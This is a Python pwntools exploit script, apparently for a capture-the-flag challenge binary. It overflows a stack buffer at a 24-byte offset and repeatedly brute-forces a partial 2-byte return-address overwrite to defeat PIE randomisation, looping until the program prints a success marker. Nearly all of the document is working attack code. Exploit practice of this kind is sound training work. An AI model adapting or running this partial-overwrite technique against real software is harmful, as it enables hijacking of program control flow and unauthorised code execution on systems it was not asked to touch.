#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template binary-exploitation-pie-overflow
from pwn import *
import random

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './chall')
context.terminal = ['wt.exe','wsl.exe']
context.log_level = 'debug'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No


offset = 24
low = 0x99

def tes():
    p = start()
    high = [c for c in range(0x00,0x100)]
    target_2bytes = (random.choice(high) << 8) | low
    payload = flat({offset: p16(target_2bytes)})
    p.send(payload)
    # p.interactive()
    output = p.recvall(timeout=1).decode(errors='ignore')
    if "COMP" in output:
        success(f"[+] Berhasil dengan overwrite 2-byte: 0x{target_2bytes:04x}")
        print(output)
        # p.interactive()
        p.close()
    else:
        # p.interactive()
        p.close()

if __name__ == "__main__":
    while 1:
        tes()



